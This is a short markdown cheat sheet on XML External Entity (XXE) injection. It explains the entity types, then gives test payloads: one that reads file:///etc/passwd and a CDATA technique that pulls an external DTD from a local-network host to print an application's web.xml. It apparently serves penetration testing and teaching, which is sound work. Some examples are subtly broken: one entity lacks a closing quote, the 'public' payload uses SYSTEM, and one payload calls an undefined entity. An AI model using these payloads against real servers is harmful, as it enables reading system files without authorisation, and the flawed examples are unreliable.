#  XML External Entity (XXE) Injection Tips

## XML Entities
* Internal Entities
    ```xml
    <!ENTITY name "entity_value">
    #Example
    <!ENTITY test "<entity-value>test value</entity-value>">
    ```
* External Entities
    * Private external entity
        ```xml
        <!ENTITY name SYSTEM "URI">
        # Example of private external entity
        <!ENTITY textinfo SYSTEM "http://domain.com>
        ```
    * Public External Entity
        ```xml
        <!ENTITY name PUBLIC "public_id" "URI">
        # Example
        <!ENTITY textinfo PUBLIC "-//W3C//TEXT orginfo//EN" "https://www.domain.com/orginfo.xml">
        ```
* Parameter Entities (%)
    ```xml
    <!ENTITY % name SYSTEM "URI">
    # Example
    <!ENTITY % food 'Breakfast'>
    <!ENTITY Title 'Bacon & Eggs would be my %course;'>
    ```
* Unparsed External Entities
    ```xml
    <!ENTITY name SYSTEM "URI" NDATA TYPE>
    <!ENTITY name PUBLIC "public_id" "URI" NDATA TYPE>
    ```

## Test Payload
### Using private External Entity
```xml
<?xml version="1.0" ?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY cat "Tom">
]>
<Contact>
<lastName>&cat;</lastName>
<firstName>Jerry</firstName>
</Contact>
```
### Using a public External Entity
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY lastname SYSTEM "file:///etc/passwd">
]>
<Contact>
<lastName>&cat;</lastName>
<firstName>Jerry</firstName>
</Contact>
```

## CDATA
* XXE that can print XML files through the CDATA:
    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE data [
    <!ELEMENT data ANY >
    <!ENTITY % start "<![CDATA[">
    <!ENTITY % file SYSTEM "file:///var/www/html/myapp/WEB-INF/web.xml" >
    <!ENTITY % end "]]>">
    <!ENTITY % dtd SYSTEM "http://192.168.1.5:8000/wrapper.dtd" >
    %dtd;
    ]>
    <Contact>
    <lastName>&wrapper;</lastName>
    <firstName>FIRSTNAME_FILLER</firstName>
    </Contact>
    ```
* Inside the wrapper.dtd (the external DTD file)
    * Its purpose is just to wrap the variables(parameters) into 1
    ```xml
    <!ENTITY wrapper "%start;%file;%end;">
    ```
